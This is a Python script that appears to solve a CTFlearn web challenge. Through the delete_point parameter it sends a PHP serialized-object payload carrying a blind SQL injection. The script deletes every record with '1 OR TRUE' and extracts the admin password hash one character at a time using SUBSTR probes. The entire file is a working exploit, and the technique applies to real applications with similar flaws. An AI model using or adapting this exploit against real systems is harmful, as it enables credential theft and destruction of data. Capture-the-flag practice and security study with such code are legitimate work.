import itertools
import re
import requests
import string

class AppClient:
  def __init__(self, base_url='https://web.ctflearn.com/grid/', logger=None):
    self.__session = requests.Session()
    self.__base_url = base_url
    self.__controller_url = f'{base_url}/controller.php'
    self.__logger = logger
    self.__point_id = 0

  def login(self, username='', password=''):
    self.__log('Logging in...')
    data = {'uname': username, 'pass': password}
    endpoint = f'{self.__controller_url}?action=login'
    request = self.__session.post(endpoint, data)
    self.__log('Logged in.')
    return request.text

  def get_admin_password_hash(self):
    self.__delete_points()
    self.__add_point(quiet=False)
    password_hash = ''
    hash_char_count = 32

    job = 'Reconstructing admin hash'
    self.__log(f'{job}...')

    for i in itertools.count(1):
      char = self.__recover_admin_password_hash_char(i)
      if char is None:
        break
      password_hash += char
      preview = '[' + password_hash.ljust(hash_char_count, '_') + ']'
      self.__log(f'{job}: {{:.1%}} {preview}'.format(i / hash_char_count))
      yield char
      self.__add_point()

    self.__delete_points()
    self.__log()
    return password_hash

  def __log(self, msg=''):
    if self.__logger:
      self.__logger(msg)

  def __make_payload(self, data):
    payload = 'O:5:"point":1:{s:2:"ID";s:%d:"%s";}'
    return payload % (len(data), data)

  def __extract_points(self, data):
    points = re.findall(r'id\s*:\s*(\d+)', data.text, re.IGNORECASE)
    return points

  def __add_point(self, x=1, y=1, quiet=True):
    data = {'x': x, 'y': y}
    endpoint = f'{self.__controller_url}?action=add_point'
    if not quiet:
      self.__log(f'Adding point ({x},{y})...')
    request = self.__session.post(endpoint, data)
    self.__point_id = self.__extract_points(request)[0]

  def __delete_points(self):
    self.__log('Deleting points...')
    payload = self.__make_payload('1 OR TRUE')
    endpoint = f'{self.__controller_url}?action=delete_point&point={payload}'
    self.__session.get(endpoint)

  def __recover_admin_password_hash_char(self, index):
    for c in dict.fromkeys(string.hexdigits.lower()):
      if self.__sniff_admin_password_hash_char(index, c):
        return c

  def __sniff_admin_password_hash_char(self, index, char):
    password = "SELECT password from user WHERE username='admin' LIMIT 1"
    probe = f'SUBSTR(({password}), {index}, 1)'
    query = f"{self.__point_id} AND LOWER({probe}) = LOWER('{char}')"
    payload = self.__make_payload(query)
    endpoint = f'{self.__controller_url}?action=delete_point&point={payload}'
    request = self.__session.get(endpoint)
    return self.__point_id not in self.__extract_points(request)
